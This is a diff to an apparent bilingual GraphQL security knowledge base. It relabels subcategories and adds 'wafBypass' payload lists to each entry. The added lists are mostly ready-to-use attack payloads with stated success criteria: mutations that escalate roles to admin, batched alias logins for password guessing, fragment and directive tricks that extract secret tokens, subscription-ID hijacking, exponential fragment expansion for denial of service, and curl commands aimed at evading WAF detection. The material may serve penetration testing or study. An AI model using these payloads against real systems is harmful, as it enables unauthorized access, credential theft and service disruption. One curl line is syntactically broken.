@@ -1,6 +1,6 @@
 {
   "schemaVersion": 1,
-  "contentStandard": 2,
+  "contentStandard": 3,
   "sourcePrefix": "api2",
   "entries": [
     {
@@ -18,8 +18,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL 对象级授权",
-        "en": "GraphQL Object-Level Authorization"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -127,7 +127,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "变量化 mutation 遮蔽",
+            "en": "Variable-Masked Mutation"
+          },
+          "command": "{\"query\":\"mutation($id:ID!,$r:String){updateUser(id:$id,role:$r){id role}}\",\"variables\":{\"id\":1,\"r\":\"admin\"}}",
+          "description": {
+            "zh": "把目标 id/role 移入变量绕过查询体中的参数特征检测。成功判据：角色被改为 admin。",
+            "en": "Moving id/role into variables masks parameter signatures inside the query text. Success: the role becomes admin."
+          }
+        },
+        {
+          "title": {
+            "zh": "别名批量越权",
+            "en": "Aliased Batch Escalation"
+          },
+          "command": "mutation{a:updateUser(id:1,role:\"admin\"){id} b:updateUser(id:2,role:\"admin\"){id} c:updateUser(id:3,role:\"admin\"){id}}",
+          "description": {
+            "zh": "单请求别名批量修改多对象绕过每请求一次的对象级检查。成功判据：多个对象同时被改。",
+            "en": "Aliased batch mutations bypass per-request object checks. Success: multiple objects are modified at once."
+          }
+        },
+        {
+          "title": {
+            "zh": "片段复用字段",
+            "en": "Fragment-Reuse Fields"
+          },
+          "command": "mutation{updateUser(id:1){...F}} fragment F on User{id email role secretToken}",
+          "description": {
+            "zh": "把敏感返回字段放进片段绕过 mutation 字段白名单。成功判据：返回片段字段内容。",
+            "en": "Placing sensitive return fields in a fragment bypasses mutation field whitelists. Success: fragment fields are returned."
+          }
+        }
+      ]
     },
     {
       "id": "api2-",
@@ -144,8 +179,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL 字段级授权",
-        "en": "GraphQL Field-Level Authorization"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -254,7 +289,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "嵌套双片段提权",
+            "en": "Nested Dual-Fragment Escalation"
+          },
+          "command": "query{user(id:1){...A ...B}} fragment A on Admin{id username} fragment B on RootAdmin{role secretToken}",
+          "description": {
+            "zh": "双片段组合绕过单片段的字段授权检查。成功判据：返回特权片段字段。",
+            "en": "Dual fragments bypass field authorization applied per single fragment. Success: privileged fragment fields return."
+          }
+        },
+        {
+          "title": {
+            "zh": "变量条件片段",
+            "en": "Variable-Conditional Fragment"
+          },
+          "command": "{\"query\":\"query($b:Boolean!){user(id:1){...A @include(if:$b)}} fragment A on Admin{id email role secretToken}\",\"variables\":{\"b\":true}}",
+          "description": {
+            "zh": "片段执行与否由变量控制，绕过静态字段审计。成功判据：变量开启时返回特权字段。",
+            "en": "Fragment execution toggled by a variable bypasses static field auditing. Success: privileged fields return when the variable is on."
+          }
+        },
+        {
+          "title": {
+            "zh": "别名复用特权字段",
+            "en": "Alias-Reuse Privileged Fields"
+          },
+          "command": "query{user(id:1){a:id b:email c:role d:secretToken}}",
+          "description": {
+            "zh": "别名映射敏感字段绕过字段名白名单。成功判据：别名项返回敏感值。",
+            "en": "Aliasing sensitive fields bypasses field-name whitelists. Success: aliased entries return sensitive values."
+          }
+        }
+      ]
     },
     {
       "id": "api2-alias",
@@ -271,8 +341,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL Alias 与限流",
-        "en": "GraphQL Aliases and Rate Limiting"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -380,7 +450,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "变量数组批量凭据",
+            "en": "Variable-Array Batch Credentials"
+          },
+          "command": "{\"query\":\"query($u:[String!]!,$p:[String!]!){r:loginBatch(user:$u,pass:$p){token}}\",\"variables\":{\"u\":[\"admin\",\"admin\",\"admin\"],\"p\":[\"password1\",\"password2\",\"password3\"]}}",
+          "description": {
+            "zh": "凭据移入变量数组绕过查询体特征与单查询限速。成功判据：批量返回至少一个 token。",
+            "en": "Credentials moved into variable arrays bypass query signatures and per-query limits. Success: at least one token returns in batch."
+          }
+        },
+        {
+          "title": {
+            "zh": "片段复用别名",
+            "en": "Fragment-Reuse Aliases"
+          },
+          "command": "query{a:login(...){...C} b:login(...){...C} c:login(...){...C}} fragment C on AuthToken{token user{id role}}",
+          "description": {
+            "zh": "共享片段承载批量别名降低查询长度特征。成功判据：限速未触发且返回多个结果。",
+            "en": "A shared fragment carries batched aliases, lowering length signatures. Success: no rate limit triggers and multiple results return."
+          }
+        },
+        {
+          "title": {
+            "zh": "单字母别名变形",
+            "en": "Single-Letter Alias Mutation"
+          },
+          "command": "query{a1:login(username:\"admin\",password:\"pw1\"){token} b1:login(username:\"admin\",password:\"pw2\"){token} c1:login(username:\"admin\",password:\"pw3\"){token}}",
+          "description": {
+            "zh": "规律别名前缀与最小长度绕过批量查询检测的长度阈值。成功判据：单请求完成多次尝试。",
+            "en": "Regular alias prefixes with minimal length bypass batch-detection thresholds. Success: multiple attempts complete in one request."
+          }
+        }
+      ]
     },
     {
       "id": "api2-batch-query",
@@ -397,8 +502,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL HTTP 批处理",
-        "en": "GraphQL HTTP Batching"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -507,7 +612,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "content-type 变换批处理",
+            "en": "content-type Batch Swap"
+          },
+          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: text/plain\" -d '[{\"query\":\"{me{id}}\"},{\"query\":\"{users{id email}}\"}]'",
+          "description": {
+            "zh": "text/plain 携带批处理数组绕过 JSON 数组体特征。成功判据：数组被解析为批查询。",
+            "en": "text/plain carrying a batch array bypasses JSON-array body signatures. Success: the array parses as batched queries."
+          }
+        },
+        {
+          "title": {
+            "zh": "混合 mutation 批处理",
+            "en": "Mixed-Mutation Batching"
+          },
+          "command": "[{\"query\":\"{users{id email}}\"},{\"query\":\"mutation{deleteUser(id:1){id}}\"},{\"query\":\"{config{secretKey}}\"}]",
+          "description": {
+            "zh": "读操作夹带 mutation 绕过按操作类型分流的限速。成功判据：删除与敏感读同批执行。",
+            "en": "Reads smuggling a mutation bypass per-operation-type rate limits. Success: the delete and sensitive read execute in one batch."
+          }
+        },
+        {
+          "title": {
+            "zh": "operationName 变形",
+            "en": "operationName Mutation"
+          },
+          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"operationName\":\"legitQuery\",\"query\":\"mutation m{config{secretKey}}\"}'",
+          "description": {
+            "zh": "operationName 标签伪装为合法查询绕过审计。成功判据：敏感 mutation 执行成功。",
+            "en": "An operationName labeled as a legit query bypasses auditing. Success: the sensitive mutation executes."
+          }
+        }
+      ]
     },
     {
       "id": "api2-subscription",
@@ -524,8 +664,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL 实时订阅授权",
-        "en": "GraphQL Real-Time Subscription Authorization"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -633,7 +773,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "子协议变形",
+            "en": "Subprotocol Mutation"
+          },
+          "command": "new WebSocket('ws://{TARGET}/graphql', ['graphql-ws','graphql-transport-ws','v1'])",
+          "description": {
+            "zh": "轮换子协议命中未鉴权的老协议处理器。成功判据：连接建立并收到订阅推送。",
+            "en": "Rotating subprotocols hits unauthenticated legacy handlers. Success: the connection opens and pushes subscription events."
+          }
+        },
+        {
+          "title": {
+            "zh": "降级查询订阅",
+            "en": "Query-as-Subscription Downgrade"
+          },
+          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"subscription{userUpdated{id email role secretToken}}\",\"operationName\":null}' -H \"X-Subscription-Protocol: apollo",
+          "description": {
+            "zh": "HTTP 通道模拟订阅协议头绕过 WebSocket-only 鉴权。成功判据：返回订阅初始数据或被接受。",
+            "en": "Simulating subscription protocol headers over HTTP bypasses WebSocket-only auth. Success: initial subscription data returns or the request is accepted."
+          }
+        },
+        {
+          "title": {
+            "zh": "订阅 ID 复用劫持",
+            "en": "Subscription-ID Reuse Hijack"
+          },
+          "command": "{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{messageCreated{id content sender{email}}}\"}}\n{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{userUpdated{secretToken}}\"}}",
+          "description": {
+            "zh": "复用已鉴权订阅 ID 携带新查询绕过每订阅鉴权。成功判据：第二个查询收到推送。",
+            "en": "Reusing an authenticated subscription id with a new query bypasses per-subscription auth. Success: the second query receives pushes."
+          }
+        }
+      ]
     },
     {
       "id": "api2-directive",
@@ -650,8 +825,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL 指令验证",
-        "en": "GraphQL Directive Validation"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -759,7 +934,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "自定义指令注入",
+            "en": "Custom Directive Injection"
+          },
+          "command": "{user(id:1){id email role secretToken @auth(bypass:true)}}\nquery @noAuth{user(id:1){secretToken}}",
+          "description": {
+            "zh": "伪造自定义指令命中实现宽松处理的指令处理器。成功判据：指令使字段返回。",
+            "en": "Forged custom directives hit leniently implemented handlers. Success: the directive makes the field return."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套 skip/include 组合",
+            "en": "Nested skip/include Combo"
+          },
+          "command": "{user(id:1){id email @skip(if:false) role @include(if:true){...on Admin{secretToken @skip(if:false)}}}}",
+          "description": {
+            "zh": "嵌套条件指令改变字段解析路径绕过静态审计。成功判据：特权字段按条件返回。",
+            "en": "Nested conditional directives alter field resolution past static auditing. Success: privileged fields return conditionally."
+          }
+        },
+        {
+          "title": {
+            "zh": "变量控制指令",
+            "en": "Variable-Controlled Directive"
+          },
+          "command": "{\"query\":\"query($s:Boolean!,$i:Boolean!){user(id:1){email @skip(if:$s) secretToken @include(if:$i)}}\",\"variables\":{\"s\":false,\"i\":true}}",
+          "description": {
+            "zh": "指令条件移入变量绕过查询体中的 true 字面特征。成功判据：敏感字段被包含返回。",
+            "en": "Moving directive conditions into variables masks literal true signatures. Success: the sensitive field is included and returned."
+          }
+        }
+      ]
     },
     {
       "id": "api2-json",
@@ -911,8 +1121,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL 查询成本控制",
-        "en": "GraphQL Query Cost Controls"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -1021,7 +1231,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "变量化深度查询",
+            "en": "Variable-Masked Depth Query"
+          },
+          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename}}}}} {a1:a{b1:b{c1:c}}} \",\"variables\":{}}' --compressed",
+          "description": {
+            "zh": "压缩传输与混合片段降低深度特征可检性。成功判据：深嵌套查询被接受执行。",
+            "en": "Compressed transport and mixed fragments lower depth detectability. Success: the deeply nested query is accepted and executed."
+          }
+        },
+        {
+          "title": {
+            "zh": "片段指数复制",
+            "en": "Exponential Fragment Replication"
+          },
+          "command": "query{...A ...A ...A ...A} fragment A on Query{...B ...B ...B} fragment B on Query{friends{...C}} fragment C on User{secretToken}",
+          "description": {
+            "zh": "片段多处展开实现指数级查询体积绕过文档大小限制。成功判据：服务器解析耗时显著上升或超时。",
+            "en": "Expanding fragments at multiple sites achieves exponential document size past size limits. Success: server parse time spikes or times out."
+          }
+        },
+        {
+          "title": {
+            "zh": "别名同字段倍增",
+            "en": "Aliased Same-Field Multiplication"
+          },
+          "command": "query{u1:users{id email} u2:users{id email} u3:users{id email} u4:users{id email} u5:users{id email} u6:users{id email} u7:users{id email} u8:users{id email}}",
+          "description": {
+            "zh": "同字段多别名绕过字段计数型复杂度估算。成功判据：单请求触发资源告警或延迟。",
+            "en": "Multiple aliases of one field bypass field-count complexity estimation. Success: one request triggers resource alerts or latency."
+          }
+        }
+      ]
     },
     {
       "id": "api2-fragment",
@@ -1038,8 +1283,8 @@
         "en": "API Security"
       },
       "subCategory": {
-        "zh": "GraphQL 文档验证",
-        "en": "GraphQL Document Validation"
+        "zh": "GraphQL 授权与滥用",
+        "en": "GraphQL Authorization & Abuse"
       },
       "prerequisites": [
         {
@@ -1148,7 +1393,42 @@
           "added-authoritative-references",
           "preserved-source-command"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "嵌套片段深度",
+            "en": "Nested Fragment Depth"
+          },
+          "command": "query{...A} fragment A on Query{...B} fragment B on Query{...C} fragment C on Query{...D} fragment D on Query{friends{id}}",
+          "description": {
+            "zh": "链式嵌套片段绕过单层循环检测。成功判据：深链片段被展开执行。",
+            "en": "Chained nested fragments bypass single-level cycle detection. Success: the deep chain expands and executes."
+          }
+        },
+        {
+          "title": {
+            "zh": "双向环变形",
+            "en": "Bidirectional Cycle Mutation"
+          },
+          "command": "query{...X} fragment X on User{friends{...Y}} fragment Y on User{friends{...X2}} fragment X2 on User{friends{...Y}}",
+          "description": {
+            "zh": "引入第三片段打断直接 A→B→A 检测模式。成功判据：循环未被拒绝并展开。",
+            "en": "Introducing a third fragment breaks direct A→B→A detection. Success: the cycle is not rejected and expands."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写与名称混淆",
+            "en": "Case & Name Confusion"
+          },
+          "command": "query{...a} fragment a on Query{...B} fragment B on Query{...c} fragment c on Query{friends{id}}\nquery{...A} fragment A on Query{...b} fragment b on Query{__typename}",
+          "description": {
+            "zh": "大小写交替的片段名绕过规范化前的重复检测。成功判据：混淆链被接受展开。",
+            "en": "Case-alternating fragment names bypass duplicate detection applied before normalization. Success: the confused chain is accepted and expands."
+          }
+        }
+      ]
     }
   ]
 }
